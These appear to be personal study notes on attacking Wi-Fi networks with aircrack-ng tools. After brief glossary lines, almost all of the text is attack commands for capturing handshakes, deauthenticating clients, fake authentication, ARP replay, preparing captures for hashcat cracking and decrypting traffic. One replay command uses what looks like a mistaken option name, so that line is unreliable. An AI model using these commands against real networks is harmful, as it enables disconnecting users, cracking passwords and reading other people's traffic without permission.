(PMK: pairwise master key)
(PSK: phase-shift keying)
(ARP: address resolution protocol)
-ARP is address resolution protocol: A TCP/IP protocol used to convert an IP address into a physical address, such as an Ethernet address. A host wishing to obtain a physical address broadcasts an ARP request onto the TCP/IP network. The host on the network that has the address in the request then replies with its physical hardware address. 

IMP iwconfig wlan0mon channel 1 -> adaptor switches itself to all channel to receive all data but it might aireplay need a fixed channel
airmon-ng start interface

airodump-ng -c _channelNumber -w ~/Desktop/filename --bssid _id wlan0mon

aireplay-ng --deauth _numberOfDeauthPackets/_0 -a [BSSID’s MAC Address] -c _clientMAC[optional] wlan0mon’

aircrack-ng -J <new hashcat file name> <cap file with handshake>

airdecap-ng -p _pw -e _essid _file

aireplay-ng --fakeauth _0/_1 -a [BSSID’s MAC Address] -h _myAdapterMAC wlan0mon
- allow the AP to reconize this adapter and respond to it 

! Need fakeauth to get response
REPLAY can generate a lot of traffic on a network so that airodump can have more information

aireplay-ng --aireplay _0/_1 -b [BSSID’s MAC Address] -h _targetAdapterMAC wlan0mon

aireplay-ng --test wlan0mon
